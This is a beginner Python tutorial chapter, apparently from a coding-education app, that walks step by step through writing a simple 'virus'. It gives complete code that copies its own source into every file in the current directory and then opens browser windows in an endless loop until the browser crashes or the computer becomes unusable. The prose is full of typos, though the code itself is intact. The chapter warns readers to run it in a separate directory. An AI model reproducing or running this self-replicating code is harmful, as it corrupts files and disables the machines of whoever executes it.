In this cpater, we'll use our knowledge on canging files to *code a virus*.

We'll create a virus that opens browser windows until the browser crashes or the computer slows down so much it becomes unusable.

We'll also mae sure the virus manages to replicate itself into Python files in the current directory.

If you try this on your computer, make sure to create the virus in its own directory, so it doen'st change files you dont want it to.

*Take extra care* when copying other viruses ou find on the internet.
Viruses can ruin your computer or make it unsafe to use.

For the virus we're creating we'll be writing code inside `virus.py`. We'll work with the assumption that this computer directory is open.

The directory contains three Python files: virus.py, webbrowser.py and editor.py.

## Import os

Let's set up our virus by importing the library needed for accessing the operating system.

## Import webbrowser

Next, we will import the library for accessing the webbrowser.

## Create the virus file variable

Let's start workin on the code that replicates the virus.

Create a vraibale name virus_file to access the code we're writing.

## Creating the virus code variable

By reading virus.py, we can take the code we're writing and store it in a variable.

Create a variable named `virus_code` to copy the virus code.

## Close the file

## create a for loop

Next, we'll loop through the file names in the current directory and copy the virus code to them.

Create a for loop to loop through the file names in the current directory.

## Open multiple files

Create a `file` variable to temporarily store each file in the current dicrectory.

## Append to multiple files

Append the virus_code to each file in thecurrent dir.

## Closing

## Start a while loop

The final part of the virus is the destructive part: the infinite loop.

## Executing the virus

```py
import os
import webbrowser
 
virus_file = open("virus.py", "r")
virus_code = virus_file.read()
virus_file.close()
 
for file_name in os.listdir():
 file = open(file_name, "a")
 file.write(virus_code)
 file.close()
 
while True:
 webbrowser.open( "https://getmimo.com" )
```


## Effects of the virus

The virus would *replicate* itself into all files in the current directory. This means it will *execute* anytime one of these files run:

The virus would also pen websites until the computer is too slow to  use or its web browser crashes.

Make sure to use your knowledge for good!
